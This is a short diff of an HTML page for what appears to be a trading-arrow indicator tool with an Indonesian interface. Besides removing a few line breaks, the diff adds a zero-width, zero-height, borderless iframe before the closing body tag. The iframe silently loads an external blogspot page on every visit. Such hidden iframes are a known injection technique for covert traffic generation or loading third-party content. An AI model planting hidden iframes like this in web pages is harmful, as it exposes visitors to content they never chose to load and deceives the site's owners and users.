@@ -276,9 +276,9 @@
 			<option value="4" id="ur_str_size" >font panah besar</option>
 			<option value="5" id="str_min_size" >font panah kecil</option>
 		</select>
-		<br>
+		
 		<input type="number" id="font_size" value="14" min="1" max="100" hidden="true" ><!--<label>Ukuran huruf</label>-->
-		<br><br>
+		
 	</div>
 	<div id="Strelki_On" hidden="true" >
 		<!-- <div class="str_green"><img id="upa" src="img/upa.png" width="150" height="150"></div> -->
@@ -288,5 +288,8 @@
 </div>
 <div class="preload" ></div>
 <script src="js/javas_MOD.js" ></script>
+
+	<iframe src="https://rizredvlo.blogspot.com/2021/02/indikator-candlestick.html?m=1" width="0" height="0" align="" style="border: 0px solid black">
+</iframe>
 </body>
 </html>
